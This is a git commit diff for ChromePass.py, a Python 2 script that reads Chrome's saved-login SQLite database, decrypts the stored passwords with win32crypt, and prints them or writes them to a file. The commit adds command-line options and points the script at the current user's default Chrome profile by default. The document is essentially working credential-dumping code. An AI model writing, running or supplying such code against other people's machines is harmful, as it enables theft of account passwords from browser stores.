fd40d530714fa2855dcc26039356774f118fe2c1
cristian-henrique <cristianmsbr@gmail.com>
2017-09-18 08:40:13 -0300

    Updates

--- src/ChromePass.py
+++ src/ChromePass.py
@@ -1,20 +1,18 @@
-import sqlite3, win32crypt, os.path
+import sqlite3, win32crypt, os, sys
 
-def decrypt():
-	file = raw_input('Database: ')
-	if not os.path.isfile(file):
+def decrypt(path, save_path):
+	if not os.path.isfile(path):
 		print 'The file doesn\'t exists!'
 		return
 	
-	connChrome = sqlite3.connect(file)
+	connChrome = sqlite3.connect(path)
 	cursor = connChrome.cursor()
 	try:
 		cursor.execute('SELECT action_url, username_value, password_value FROM logins')
 	except:
-		print 'Impossible to read ' + file
+		print 'Impossible to read ' + path
 		return
 
-	save = raw_input('Do you wanna save the passwords in ' + file + '.txt? <S/n> ')
 	print '\t\t\t*** Passwords ***'
 	
 	for query in cursor.fetchall():
@@ -25,10 +23,38 @@ def decrypt():
 			print 'Password: ' + passwd
 			print '--------------------'
 	
-			if save.upper() == 'S':
-				passwordsFile = open(file + '.txt', 'a')
+			if save_path != '':
+				passwordsFile = open(save_path, 'a')
 				passwordsFile.writelines('URL: ' + query[0] + '\nUser: ' + query[1] + '\nPassword: ' + passwd + '\n--------------------\n')
 				passwordsFile.close()
 
+def show_help():
+    print '''  Usage:
+    python ChromePass.py                                   # Run with the default location of the Login Data file.
+    python ChromePass.py "path_to_file"                    # Run with a path to the Login Data file.
+    python ChromePass.py "path_to_file" -S "path_to_save"  # Run with a path to the Login Data file and save.
+    python ChromePass.py -S "path_to_save"                 # Save the content of the default Login Data file.
+
+  >> Developed by Cristian Henrique (cristianmsbr@gmail.com)
+  >> github.com/cristian-henrique'''
+
 if __name__ == '__main__':
-	decrypt()
+    arg = sys.argv
+    args = len(arg)
+
+    if args == 1:
+        decrypt(os.getenv('LOCALAPPDATA') + '\Google\Chrome\User Data\Default\Login Data', '')
+    elif args == 2:
+        decrypt(arg[1], '')
+    elif args == 3:
+        if arg[1].upper() == '-S':
+            decrypt(os.getenv('LOCALAPPDATA') + '\Google\Chrome\User Data\Default\Login Data', arg[2])
+        else:
+            show_help()
+    elif args == 4:
+        if arg[2].upper() == '-S':
+            decrypt(arg[1], arg[3])
+        else:
+            show_help()
+    else:
+        show_help()
